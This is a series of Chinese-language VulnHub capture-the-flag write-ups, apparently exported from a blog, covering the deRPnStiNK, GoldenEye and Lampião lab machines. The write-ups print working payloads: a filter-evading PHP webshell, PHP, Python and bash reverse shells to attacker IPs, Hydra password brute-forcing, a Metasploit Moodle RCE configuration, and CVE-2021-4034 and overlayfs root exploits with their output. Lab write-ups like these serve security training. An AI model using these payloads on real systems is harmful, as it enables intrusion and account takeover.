pwd.txt\n\n\n\n登录验证绕过​\tstrcmp判断两个字符是否相等时，如果两个字符串相等，返回结果为0，但如果是字符串和数字进行比较，也会返回0。\n​\t提示里面说的意思这里没有通过数据库查看密码，而是直接写在代码里进行对比，\n​\t所以这里将密码字段pass改为pass[]，直接绕过登录验证。\n\nflag3flag3&#123;Y29udGludWVUT2Ntcw==&#125;\n\n\n\n文件上传上传白名单​\t经测试，这里是白名单，后缀必须是png、jpg、gif，上传gif显示乱码，怀疑这里gif会被作为php脚本解析，然后上传phpinfo测试。\n\ngif被解析​\t结果gif确实被解析了。\n\n\n限制函数绕过​\t本来想直接用蚁剑生成的一句话，但是显示禁用了Base64 decode函数，后续尝试了多种一句话，在黑盒测试的情况下，总结了回显里面的禁用。\t\n\n\n1.文件后缀必须是 png、jpg、gif2.content-type必须与上述匹配3.文件内容检查：\t文件头必须为白名单的文件头\t不能涉及base64_decode\t不能使用eval等常用函数\n\n​\t最后一条，虽然上传代码执行函数assert不回拦截，但是用不了，最后使用下面的一句话，蚁剑成功连接。\n&lt;?php //?cmd=phpinfo();$func =create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);$func();?&gt;\n\n参考文章：https://www.cnblogs.com/xiaozi/p/7834367.html\n\n\n\nflag5\nflag5&#123;YWdlbnRzZXJ2aWNlcw==&#125;agentservices\n\n\n\n权限提升​\t\t目标机器没有python环境，用php执行反弹shell。\n&lt;?php $sock=fsockopen(&quot;192.168.2.162&quot;,2233);exec(&quot;/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;);?&gt;\n\n\n\nCVE-2021-4034gcc cve-2021-4034-poc.c -o exp./exp\n\n\nflag6cat Flag.txtflag6&#123;R2gwc3RQcm90MGMwbHM=&#125;Gh0stProt0c0ls\n\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-deRPnStiNK1","url":"/2022/08/07/vulnhub-deRPnStiNK1/","content":"概述信息收集主机发现nmap -sP 192.168.2.0/24Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.159Host is up (0.016s latency).\n\n\n\n端口服务扫描nmap -p-  192.168.2.159  Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.159Host is up (0.042s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 11.50 seconds\n\nmap -p21,22,80 -sV -A -T5 192.168.2.159Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.159Host is up (0.0100s latency).PORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.222/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))| http-robots.txt: 2 disallowed entries |_/php/ /temporary/|_http-title: DeRPnStiNK|_http-server-header: Apache/2.4.7 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds\n\n目录扫描dirsearch -u http://192.168.2.159/ -x 403             \n\n\nroboot.txt\n&#x2F;phpdirsearch -u http://192.168.2.159/php -x 403\n\n\n&#x2F;temporarydirsearch -u http://192.168.2.159/temporary/ -x 403  \n\n\n\n&#x2F;weblogdirsearch -u http://192.168.2.159/weblog/ -x 403  \n\n\nflagDeRPnStiNK\t&lt;--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) --&gt;\n\n\ninfo.txt\n\n\n​\t此处提示说需要修改host文件，在上述对weblog进行目录扫描的时候，显示回跳转到derpnstink.local域名下，所以修改hosts的时候与之对应。\n\n\n\n\n\n\n\n\n漏洞利用​\t弱口令admin&#x2F;admin登录后，开始查看功能点，找到添加幻灯片的页面可以上传文件，直接上传php后门，上传后跳转首页，没找到返回路径，不知道是否上传成功，然后重新走了一遍正常上传图片的流程，审查元素，找到图片上传路径。\nhttp://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/33.png\n\n\n\n\n\n​\t然后直接访问刚出上传的文件1.php。发现存在该文件，蚁剑连接成功。\n\n\n\n\n\n权限提升​\t虽然找到了mysql root账户的密码，但是由于mysql是mysql用户启动，所以不能使用udf提权。\t\nuser = name  mysqld程序在启动后将在给定UNIX/Linux账户下运行; mysqld必须从root账户启动才干在启动后切换到还有一个账户下运行; mysqld_safe脚本将默认使用–user=mysql选项来启动mysqld程序。\n\n\n\n\nCVE-2021-4034https://github.com/arthepsy/CVE-2021-4034/blob/main/cve-2021-4034-poc.c\n\nflag\ncat /home/stinky/Desktop/flag.txtflag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)\n\n\nfind /root -name flag*cat /root/Desktop/flag.txt\n\n\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub_goldeneye","url":"/2022/08/01/vulnhub-goldeneye/","content":"概述\n信息收集获取moodle的admin密码\nmoodle admin权限下，通过CVE-2013-3630 getshell\nCVE-2015-1328本地提权\n\n信息收集获取靶机IPnmap -sP 192.168.56.0/24Nmap scan report for 192.168.56.103Host is up (0.40s latency).\n\n端口服务扫描全端口扫描、获取所有信息\nnmap -p- 192.168.56.103PORT      STATE SERVICE25/tcp    open  smtp53/tcp    open  domain80/tcp    open  http55006/tcp open  unknown55007/tcp open  unknownnmap -sS -sV -T5 -p25,53,80,55006,55007 192.168.56.103PORT      STATE SERVICE  VERSION25/tcp    open  smtp     Postfix smtpd53/tcp    open  domain   dnsmasq 2.8180/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))55006/tcp open  ssl/pop3 Dovecot pop3d55007/tcp open  pop3     Dovecot pop3d\n\n\n\n80端口\n进入&#x2F;sev-home路径\n查看网页源码\n打开terminal.js\n//Boris, make sure you update your default password. //My sources say MI6 maybe planning to infiltrate. //Be on the lookout for any suspicious network traffic....////I encoded you p@ssword below...////&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;////BTW Natalya says she can break your codes翻译：//Boris，确保更新默认密码。//我的消息来源说军情六处可能计划渗透。//警惕任何可疑的网络流量。。。。////我给你编码p@ssword在下面//////顺便说一句，Natalya说她可以破解你的密码\n\nhtml-decode\n获取信息name:  Boris  Natalyapwd:  InvincibleHack3r\n\n认证通过&#x2F;sev-home​\t根据提示信息，成功通过&#x2F;sev-home。\n登录成功的信息为：\n​\tboris&#x2F;InvincibleHack3r\n\n\n&lt;h1&gt;GoldenEye&lt;/h1&gt;&lt;p&gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) &lt;/p&gt;&lt;p&gt;Please email a qualified GNO supervisor to receive the online &lt;b&gt;GoldenEye Operators Training&lt;/b&gt; to become an Administrator of the GoldenEye system&lt;/p&gt;&lt;p&gt;Remember, since &lt;b&gt;&lt;i&gt;security by obscurity&lt;/i&gt;&lt;/b&gt; is very effective, we have configured our pop3 service to run on a very high non-default port&lt;/p&gt;&lt;/div&gt;&lt;h1&gt;黄金眼&lt;/h1&gt;&lt;p&gt;GoldenEye是一个高度机密的苏联原始武器项目。由于您有访问权限，您肯定持有绝密许可证，并有资格成为认证的GoldenEye网络运营商（GNO）&lt;/p&gt;&lt;p&gt;请向合格的GNO主管发送电子邮件，接受在线GoldenEye操作员培训，成为GoldenEye系统管理员&lt;/p&gt;&lt;p&gt;请记住，由于模糊安全非常有效，我们已将pop3服务配置为在非常高的非默认端口上运行&lt;/p&gt;&lt;/div&gt;\n\n55006与55007端口​\t通过nmap扫描这两个端口开启的服务的详细信息。\n┌──(kali㉿Kali)-[~]└─$ nmap -p55006,55007 -sV -A -T4 192.168.56.103Nmap scan report for 192.168.56.103Host is up (0.34s latency).PORT      STATE SERVICE  VERSION55006/tcp open  ssl/pop3 Dovecot pop3d| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server| Not valid before: 2018-04-24T03:23:52|_Not valid after:  2028-04-23T03:23:52|_ssl-date: TLS randomness does not represent time55007/tcp open  pop3     Dovecot pop3d|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) PIPELINING RESP-CODES UIDL CAPA TOP STLS|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server| Not valid before: 2018-04-24T03:23:52|_Not valid after:  2028-04-23T03:23:52Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 51.45 seconds\n\n​\t通过探测的结果可以知道，这两个端口开放了pop3的mail服务，根据提示信息，在mail服务中，可能存在Boris未修改默认密码。\nHydra暴力破解pop3服务​\t根据提示信息，搜集到的用户名字典为：\nborisnatalya\n\nhydra -L name.txt -P /usr/share/wordlists/fasttrack.txt 192.168.56.103 -s 55007 pop3[55007][pop3] host: 192.168.56.103   login: boris   password: secret1![55007][pop3] host: 192.168.56.103   login: natalya   password: bird1 of 1 target successfully completed, 2 valid passwords found\n\n​\t通过hydra进行爆破，得到了两个账号的密码，接下来通过对其进行信息收集。通过nc对\nboris账号nc 192.168.56.103 55007+OK GoldenEye POP3 Electronic-Mail Systemuser boris+OKpass secret1!+OK Logged in.list+OK 3 messages:1 5442 3733 921.retr 1+OK 544 octetsReturn-Path: &lt;root@127.0.0.1.goldeneye&gt;X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id D9E47454B1        for &lt;boris&gt;; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)Message-Id: &lt;20180425022326.D9E47454B1@ubuntu&gt;Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)From: root@127.0.0.1.goldeneyeBoris, this is admin. You can electronically communicate to co-workers and students here. I&#x27;m not going to scan emails for security risks because I trust you and the other admins here..retr 2  +OK 373 octetsReturn-Path: &lt;natalya@ubuntu&gt;X-Original-To: borisDelivered-To: boris@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id C3F2B454B1        for &lt;boris&gt;; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu&gt;Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)From: natalya@ubuntuBoris, I can break your codes!.retr 3+OK 921 octetsReturn-Path: &lt;alec@janus.boss&gt;X-Original-To: borisDelivered-To: boris@ubuntuReceived: from janus (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id 4B9F4454B1        for &lt;boris&gt;; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu&gt;Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)From: alec@janus.bossBoris,Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....PS - Keep security tight or we will be compromised..\n\n翻译：\nFrom: root@127.0.0.1.goldeneye鲍里斯，这是管理员。 您可以在此处与同事和学生进行电子交流。 我不会扫描电子邮件是否存在安全风险，因为我相信你和这里的其他管理员。From: natalya@ubuntu鲍里斯，我可以破解你的密码！From: alec@janus.boss鲍里斯，您与我们辛迪加的合作将获得丰厚回报。 附件是 GoldenEye 的最终访问代码。 将它们放在此服务器根目录中的隐藏文件中，然后从该电子邮件中删除。 这些访问代码只能有一组，我们需要保护它们以供最终执行。 如果他们被找回并被俘虏，我们的计划将会崩溃和燃烧！\n\n\n\nnatalya账号nc 192.168.56.103 55007use+OK GoldenEye POP3 Electronic-Mail Systemuser natalya+OKpass bird+OK Logged in.list+OK 2 messages:1 6312 1048.retr 1+OK 631 octetsReturn-Path: &lt;root@ubuntu&gt;X-Original-To: natalyaDelivered-To: natalya@ubuntuReceived: from ok (localhost [127.0.0.1])        by ubuntu (Postfix) with ESMTP id D5EDA454B1        for &lt;natalya&gt;; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu&gt;Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)From: root@ubuntuNatalya, please you need to stop breaking boris&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus..retr 2+OK 1048 octetsReturn-Path: &lt;root@ubuntu&gt;X-Original-To: natalyaDelivered-To: natalya@ubuntuReceived: from root (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id 17C96454B1        for &lt;natalya&gt;; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)From: root@ubuntuOk Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle :)Ok, user creds are:username: xeniapassword: RCP90rulez!Boris verified her as a valid contractor so just create the account ok?And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir**Make sure to edit your host file since you usually work remote off-network....Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts..\n\n翻译：\nFrom: root@ubuntu娜塔莉亚，请你不要再破坏鲍里斯的密码了。 此外，您是 GNO 培训主管。 一旦学生被指定给您，我将通过电子邮件发送给您。此外，请注意可能的网络漏洞。 我们有情报表明，一个名为 Janus 的犯罪集团正在追捕 GoldenEye。From: root@ubuntu好的，娜塔琳，我有一个新学生要给你。 由于这是一个新系统，如果您发现任何配置问题，请让我或鲍里斯知道，尤其是它与安全性有关...即使不是，只需以“安全性”为幌子输入...它会 毫不费力地升级变更单 :)好的，用户信用是：用户名：xenia密码：RCP90rulez！Boris 验证了她是一个有效的承包商，所以只需创建帐户，好吗？如果您没有外部内部域的 URL：severnaya-station.com/gnocertdir**请确保编辑您的主机文件，因为您通常在远程离线工作......由于您是 Linux 用户，只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com。\n\n重要信息提取username:xeniapassword:RCP90rulez！domain:severnaya-station.comURL:severnaya-station.com/gnocertdir\n\n访问severnaya-station.com&#x2F;gnocertdir修改hosts文件根据提示信息，首先修改hosts文件，然后访问信息中的URL地址。\n\n\n登录地址http://severnaya-station.com/gnocertdir/login/index.php\n\n根据前面得到的账号密码尝试登录。\nxenia/RCP90rulez！\n\n\n邮箱中只存在一封邮件：\n\n邮件信息：Greetings Xenia,As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.My email username is...doakThank you,Cheers,Dr. Doak &quot;The Doctor&quot;Training Scientist - Sr Level Training Operating SupervisorGoldenEye Operations Center SectorLevel 14 - NO2 - id:998623-1334Campus 4, Building 57, Floor -8, Sector 6, cube 1,007Phone 555-193-826Cell 555-836-0944Office 555-846-9811Personal 555-826-9923Email: doak@Please Recycle before you print, Stay Green aka save the company money!&quot;There&#x27;s such a thing as Good Grief. Just ask Charlie Brown&quot; - someguy&quot;You miss 100% of the shots you don&#x27;t shoot at&quot; - Wayne G.THIS IS A SECURE MESSAGE DO NOT SEND IT UNLESS.翻译：问候 Xenia，作为我们 GoldenEye 培训的新承包商，我欢迎您。 完成您的帐户后，您的仪表板上将显示更多课程。 如果您有任何问题，请通过电子邮件给我发消息，而不是在这里。我的邮箱用户名是...多克谢谢，干杯，多克博士“医生”培训科学家 - 高级培训运营主管GoldenEye运营中心部门14 级 - NO2 - id:998623-1334Campus 4, Building 57, Floor -8, Sector 1,007电话 555-193-826手机 555-836-0944办公室 555-846-9811个人 555-826-9923邮箱：doak@请在打印前回收利用，保持绿色，也就是节省公司的钱！“有像 Good Grief 这样的东西。问问 Charlie Brown”——someguy“你错过了 100% 没有投篮的投篮”——韦恩 G.这是一条安全消息，除非，否则请勿发送。\n\n\n\npop3-&gt;爆破用户doak​\t未获取到其他的信息，信息中能获取到的是一个新的用户名doak，只能回到55007端口尝试使用doak进行爆破。\nhydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://192.168.56.103:55007[55007][pop3] host: 192.168.56.103   login: doak   password: goat\n\ndoak账号nc 192.168.56.103 55007+OK GoldenEye POP3 Electronic-Mail Systemuser doak+OKpass goat+OK Logged in.list+OK 1 messages:1 606.retr 1+OK 606 octetsReturn-Path: &lt;doak@ubuntu&gt;X-Original-To: doakDelivered-To: doak@ubuntuReceived: from doak (localhost [127.0.0.1])        by ubuntu (Postfix) with SMTP id 97DC24549D        for &lt;doak&gt;; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)From: doak@ubuntuJames,If you&#x27;re reading this, congrats you&#x27;ve gotten this far. You know how tradecraft works right?Because I don&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......username: dr_doakpassword: 4England!.\n\n翻译：詹姆士，如果您正在阅读本文，那么恭喜您已经走到了这一步。 你知道tradecraft是如何运作的吗？因为我没有。 访问我们的培训网站并登录我的帐户....挖掘直到您可以泄露更多信息......\n\n​\t根据提示，使用给定的用户名密码继续访问前面给出的website。\ndr_doak登录website登录网站后发现右边有一个s3cret.txt文件，点击后下载。\n\n\n翻译：007,我能够通过 clear txt 捕获这个应用程序 adm1n cr3ds。GoldenEye 服务器中的大多数 Web 应用程序中的文本都会被扫描，因此我无法在此处添加 cr3dentials。juicy 的东西在这里：/dir007key/for-007.jpg您可能也知道，RCP-90 远胜于任何其他武器，而杀戮许可证是唯一的游戏方式。\n\nfor-007.jpg得到有效信息，访问该图片。\nhttp://severnaya-station.com/dir007key/for-007.jpg\n\n\n图片看起来没什么有用信息，下载下来分析。\nwget http://severnaya-station.com/dir007key/for-007.jpgstrings for-007.jpg JFIFExifeFdpbnRlcjE5OTV4IQ==GoldenEyelinuxFor James02310100ASCIIFor 007&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;             !      !!!   !!!!!!!!&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;......          \n\n\n\nbase64解码：\necho eFdpbnRlcjE5OTV4IQ== | base64 --decodexWinter1995x!\n\n\n\n​\t文本中提到他能通过明文获取admin的密码在这个图片里面，得出这里base64解码的结果是应用中admin的密码。\n漏洞利用-CVE-2013-3630方式一：MSF​\t识别出cms以及版本后，搜索其版本的漏洞。\n\n\n\n​\t搜索出来在Metasploit中有exp可以使用,但多次尝试不成功，后了解到exp中需要执行PSpellshell\n\nShell engine​\t在web应用中修改设置：\nHome - Site administration - Plugins - Text editors - TinyMCE HTML editor - PSpellShell\n\nmsfconsolemsfconsole use exploit/multi/http/moodle_spelling_binary_rceset username adminset password xWinter1995x!set rhost severnaya-station.comset targeturi /gnocertdirset payload cmd/unix/reverseset lhost 10.1.1.184exploit\n\n\n\n方式二：手动触发​\t手动发出同样需要修改Shell engine。\nPage to aspellHome - Site administration - Server - System paths\n\n​\t在此处修改为python反弹shell的代码。\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.1.1.184&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;\n\nToggle spellchecherHome - My profile - Blogs - Add a new entry\n​\t点击该按钮触发前面的命令反弹shell。\n\n成功反弹iduid=33(www-data) gid=33(www-data) groups=33(www-data)whoamiwww-datapython -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ &lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n\n\n权限提升查看内核版本&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ uname -auname -aLinux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU\n\n搜索内核版本的exp\noverlayfs本地权限提升\n​\toverlayfs文件系统是一种叠合式文件系统，实现了在底层文件系统上叠加另一个文件系统。Linux 内核3.18开始已经加入了对overlayfs的支持。Ubuntu Linux内核在更早的版本就已加入该支持。\n​\tUbuntu Linux内核的overlayfs文件系统实现中存在一个权限检查漏洞，本地普通用户可以获取管理员权限。此漏洞影响所有目前官方支持的Ubuntu Linux版本，目前已经发布攻击代码，建议受影响用户尽快进行升级。\n​\t此漏洞源于overlayfs文件系统在上层文件系统目录中创建新文件时没有正确检查文件权限。它只检查了被修改文件的属主是否有权限在上层文件系统目录写入，导致当从底层文件系统目录中拷贝一个文件到上层文件系统目录时，文件属性也随同拷贝过去。如果Linux内核设置了CONFIG_USER_NS&#x3D;y和FS_USERNS_MOUNT标志，将允许一个普通用户在低权限用户命名空间中mout一个overlayfs文件系统。本地普通用户可以利用该漏洞在敏感系统目录中创建新文件或读取敏感文件内容，从而提升到管理员权限。\n\n​\t根据信息，直接把文件放在环境，通过运行gcc编译后的文件即可将权限提升为root。\nexploits-37292&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ gcc 37292.c -o expgcc 37292.c -o expThe program &#x27;gcc&#x27; is currently not installed. To run &#x27;gcc&#x27; please ask your administrator to install the package &#x27;gcc&#x27;\n\n​\t由于gcc没有安装，所以这里使用cc进行编译，另外，由于代码中也使用到了gcc，也需要改为cc。\n\n​\t修改好的文件通过msf上传至靶机，然后通过cc进行编译。\n&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cc 37292.c -o expcc 37292.c -o exp37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]&#125;^37292.c:106:12: warning: implicit declaration of function &#x27;unshare&#x27; is invalid in C99 [-Wimplicit-function-declaration]        if(unshare(CLONE_NEWUSER) != 0)           ^37292.c:111:17: warning: implicit declaration of function &#x27;clone&#x27; is invalid in C99 [-Wimplicit-function-declaration]                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);                ^37292.c:117:13: warning: implicit declaration of function &#x27;waitpid&#x27; is invalid in C99 [-Wimplicit-function-declaration]            waitpid(pid, &amp;status, 0);            ^37292.c:127:5: warning: implicit declaration of function &#x27;wait&#x27; is invalid in C99 [-Wimplicit-function-declaration]    wait(NULL);    ^5 warnings generated.&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ lsls37292.c        config.php        editor_plugin_src.js  includeschangelog.txt  css               exp                   rpc.phpclasses        editor_plugin.js  img&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ./exp./expspawning threadsmount #1mount #2child threads done/etc/ld.so.preload createdcreating shared library# ididuid=0(root) gid=0(root) groups=0(root),33(www-data)# \n\ncat flag# cd /rootcd /root# lsls# ls -lals -latotal 44drwx------  3 root root 4096 Apr 29  2018 .drwxr-xr-x 22 root root 4096 Apr 24  2018 ..-rw-r--r--  1 root root   19 May  3  2018 .bash_history-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrcdrwx------  2 root root 4096 Apr 28  2018 .cache-rw-------  1 root root  144 Apr 29  2018 .flag.txt-rw-r--r--  1 root root  140 Feb 19  2014 .profile-rw-------  1 root root 1024 Apr 23  2018 .rnd-rw-------  1 root root 8296 Apr 29  2018 .viminfo# cat .flag.txtcat .flag.txtAlec told me to place the codes here: 568628e0d993b1973adc718237da6e93If you captured this make sure to go here...../006-final/xvf7-flag/# \n\n进入&#x2F;006-final&#x2F;xvf7-flag&#x2F;\n\n旗帜被捕获恭喜你*******************************你抓到密码了！并阻止了亚历克·特雷维良进行他坚不可摧的复仇！！！！****************************************\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-lampiao","url":"/2022/08/02/vulnhub-lampiao/","content":"概述\nGetshell\n信息收集 —&gt; ssh爆破\ncve-2018-7600\nexp\nmsf\n\n\n\n\ndirtyC0w2提权\n\n信息收集主机发现目标靶机的IP地址为102。\nnmap -sP 192.168.1.0/24Nmap scan report for 192.168.1.1Host is up (0.0029s latency).Nmap scan report for 192.168.1.102Host is up (0.011s latency).Nmap scan report for 192.168.1.104Host is up (0.0016s latency).Nmap scan report for 192.168.1.108Host is up (0.0012s latency).Nmap done: 256 IP addresses (4 hosts up) scanned in 5.11 seconds\n\n端口扫描nmap -p- 192.168.1.102Nmap scan report for 192.168.1.102Host is up (0.017s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http1898/tcp open  cymtec-portNmap done: 1 IP address (1 host up) scanned in 8.37 seconds\n\n\n\n80端口80端口展示没有可用信息。\n\n\n\n\n1898端口\n\n目录扫描dirsearch -u http://192.168.1.102:1898/ -x 403                                   _|. _ _  _  _  _ _|_    v0.4.2                                                                                            (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                               Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Target: http://192.168.1.102:1898/[19:24:42] Starting: [19:24:44] 200 -    1KB - /COPYRIGHT.txt                                    [19:24:44] 200 -  108KB - /CHANGELOG.txt                                    [19:24:44] 200 -    2KB - /INSTALL.mysql.txt                                [19:24:44] 200 -    2KB - /INSTALL.pgsql.txt[19:24:44] 200 -    9KB - /MAINTAINERS.txt                                  [19:24:44] 200 -   18KB - /INSTALL.txt                                      [19:24:44] 200 -   18KB - /LICENSE.txt                                      [19:24:44] 200 -    5KB - /README.txt                                       [19:24:45] 200 -   10KB - /UPGRADE.txt                                      [19:24:51] 301 -  323B  - /includes  -&gt;  http://192.168.1.102:1898/includes/[19:24:51] 200 -   10KB - /includes/                                        [19:24:51] 200 -    3KB - /install.php                                      [19:24:51] 200 -   11KB - /index.php                                        [19:24:52] 200 -  132KB - /includes/bootstrap.inc                           [19:24:53] 301 -  319B  - /misc  -&gt;  http://192.168.1.102:1898/misc/        [19:24:54] 301 -  322B  - /modules  -&gt;  http://192.168.1.102:1898/modules/  [19:24:54] 200 -    9KB - /modules/                                         [19:24:55] 301 -  323B  - /profiles  -&gt;  http://192.168.1.102:1898/profiles/[19:24:55] 200 -  271B  - /profiles/minimal/minimal.info[19:24:55] 200 -  278B  - /profiles/testing/testing.info[19:24:55] 200 -  743B  - /profiles/standard/standard.info                  [19:24:56] 200 -    2KB - /robots.txt                                       [19:24:56] 200 -    3KB - /scripts/                                         [19:24:56] 301 -  322B  - /scripts  -&gt;  http://192.168.1.102:1898/scripts/[19:24:57] 200 -  904B  - /sites/README.txt                                 [19:24:57] 301 -  320B  - /sites  -&gt;  http://192.168.1.102:1898/sites/      [19:24:57] 200 - 1020B  - /sites/all/themes/README.txt[19:24:57] 200 -  151B  - /sites/all/libraries/README.txt                   [19:24:57] 200 -    1KB - /sites/all/modules/README.txt                     [19:24:57] 200 -    0B  - /sites/example.sites.php                          [19:24:58] 301 -  321B  - /themes  -&gt;  http://192.168.1.102:1898/themes/    [19:24:58] 200 -    2KB - /themes/[19:24:59] 200 -    2KB - /web.config[19:24:59] 200 -   42B  - /xmlrpc.php                       \n\n\n\n​\tcms版本为Drupal 7.54\nnode&#x2F;2​\t打开网站后，发现有两个文章，第一个好像是故事介绍。\nLampião，Sertão 的英雄还是恶棍？\n\n\n\n只是测试..LuizGonzaga-LampiaoFalou.mp3node 2 不工作:(\n\n​\t这篇文章中显示的mp3为正常的音乐，然后这里提到了node2不工作，根据访问的规律，访问?q=node/2\n\nhttp://192.168.1.102:1898/audio.m4a # 音频为：user tiagohttp://192.168.1.102:1898/qrc.png # 为二维码，扫码结果为：Try harder! muahuahua\n\n\n\nssh爆破​\t根据语音的提示，用户名为tiago，然后选择通过第一篇文章生成密码字典，然后对ssh服务进行爆破。\ncewl生成密码字典cewl http://192.168.1.102:1898/?q=node/1 -w pwd.txtCeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)\n\nhydra爆破hydra -l tiago -P pwd.txt ssh://192.168.1.102:22 [DATA] attacking ssh://192.168.1.102:22/[22][ssh] host: 192.168.1.102   login: tiago   password: Virgulino\n\n\n\n漏洞利用-CVE-2018-7600exppython脚本​\thttps://github.com/pimps/CVE-2018-7600\n\n/bin/bash -i &gt; /dev/tcp/192.168.1.107/6666 0&lt;&amp; 2&gt;&amp;1bash -i &gt;&amp; /dev/tcp/192.168.1.107/6666 0&gt;&amp;1python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.107&quot;,6666));os.dup2(s.fileno(),0); 